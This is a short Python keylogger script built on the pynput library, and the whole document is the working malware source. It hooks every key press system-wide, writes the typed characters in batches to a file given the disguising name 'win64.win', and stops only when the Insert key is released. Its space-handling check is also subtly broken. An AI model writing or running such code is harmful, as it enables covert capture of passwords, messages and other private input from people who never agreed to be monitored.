import pynput

from pynput.keyboard import Key, Listener

count = 0
keys = []

def press(key):
    global keys, count
    keys.append(key)
    count += 1

    if count >= 20:
        count = 0
        write_file(keys)
        keys = []


def write_file(keys):
    with open("win64.win", "a") as f:
        for key in keys:
            k = str(key).replace("'", "")
            if k.find("Key.space") > 0:
                f.write('\n')
            elif k.find("Key") == -1:
                f.write(k)

def release(key):
    if key == Key.insert:
        return False

with Listener(on_press=press, on_release=release) as listener:
    listener.join()
